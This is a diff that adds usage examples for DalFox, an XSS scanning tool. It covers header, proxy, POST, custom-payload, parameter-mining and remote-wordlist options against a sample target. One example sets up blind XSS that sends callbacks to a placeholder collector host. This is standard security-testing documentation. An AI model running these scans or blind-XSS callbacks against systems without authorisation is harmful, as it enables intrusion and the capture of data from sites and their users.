@@ -189,3 +189,45 @@ dalfox url "$url" --timeout 15
 
 These examples cover various functionalities provided by DalFox, from basic scanning to more advanced configurations with headers, cookies, proxies, and custom payloads. 
   
+
+
+ ====Advanced examples
+ with -H or --header.
+
+These examples assume the use of options that fit within the DalFox's supported parameters based on its help documentation:
+
+Basic Scan with Custom Settings:
+dalfox url http://test.nterest.com --user-agent "Kona" --timeout 60 -H "Connection: keep-alive"
+
+File Mode with Advanced Settings:
+dalfox file targets.txt --user-agent "Kona" --timeout 60 -H "Connection: keep-alive"
+
+Pipeline Mode with Advanced Settings:
+echo "http://test.nterest.com" | dalfox pipe --user-agent "Kona" --timeout 60 -H "Connection: keep-alive"
+
+Using POST Method with JSON Body:
+dalfox url http://test.nterest.com -X POST -d '{"key":"value"}' --user-agent "Kona" --timeout 60 -H "Connection: keep-alive" -H "Content-Type: application/json"
+
+Blind XSS with Custom Settings:
+dalfox url http://test.nterest.com -b http://your.xss.ht --user-agent "Kona" --timeout 60 -H "Connection: keep-alive"
+
+
+Using Proxy with Advanced Settings:
+dalfox url http://test.nterest.com --proxy http://127.0.0.1:8080 --user-agent "Kona" --timeout 60 -H "Connection: keep-alive"
+
+
+Custom Payload and Header Injection:
+dalfox url http://test.nterest.com --custom-payload mypayloads.txt --user-agent "Kona" --timeout 60 -H "Connection: keep-alive" -H "X-Injected-Header: test"
+
+Parameter Mining with Advanced Settings:
+dalfox url http://test.nterest.com --mining-dict --user-agent "Kona" --timeout 60 -H "Connection: keep-alive"
+
+
+Scan with Output to File Including Requests:
+dalfox url http://test.nterest.com -o results.txt --output-request --user-agent "Kona" --timeout 60 -H "Connection: keep-alive"
+
+
+Using Remote Payloads and Wordlists with Advanced Settings:
+
+dalfox url http://test.nterest.com --remote-payloads payloadbox --remote-wordlists burp --user-agent "Kona" --timeout 60 -H "Connection: keep-alive"
+
